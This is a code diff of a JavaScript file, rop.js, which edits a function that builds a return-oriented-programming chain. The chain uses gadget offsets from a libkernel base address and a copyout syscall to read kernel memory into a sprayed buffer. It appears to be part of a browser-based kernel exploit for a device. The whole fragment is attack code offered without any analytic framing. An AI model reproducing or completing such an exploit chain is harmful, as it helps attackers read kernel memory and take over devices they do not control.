@@ -1,3 +1,5 @@
+// rop.js
+
 function schedule_read64(addr) {
   ropChain = new Uint32Array(0x400);
   let i = 0;
@@ -10,10 +12,7 @@ function schedule_read64(addr) {
   const GADGET_SYSCALL = LIBKERNEL_BASE + 0x1A2F28;
 
   const SYSCALL_COPYOUT = 0x3B;
-  const USER_BUF_ADDR = 0x133713370300;
-  const GADGET_RET = LIBKERNEL_BASE + 0x1A2000; // example
-  
-  ropChain[i++] = GADGET_RET & 0xFFFFFFFF;
+  const USER_BUF_ADDR = 0x133713370300; // must match sprayed addr
 
   ropChain[i++] = GADGET_POP_X0 & 0xFFFFFFFF;
   ropChain[i++] = SYSCALL_COPYOUT;
@@ -29,11 +28,10 @@ function schedule_read64(addr) {
 
   ropChain[i++] = GADGET_SYSCALL & 0xFFFFFFFF;
 
-  // Write destination marker into expected location
-  const offset = 0x300 / 4;
-  const view = new DataView(read_target.buffer);
+  // Fill target marker in JS buffer (for detection)
+  const view = new DataView(window.read_target.buffer);
   view.setUint32(0, 0xAAAAAAAA, true);
   view.setUint32(4, 0xBBBBBBBB, true);
 
-  debug_log("ROP read64() scheduled.");
+  debug_log("ROP chain for read64 scheduled. Waiting for execution...");
 }
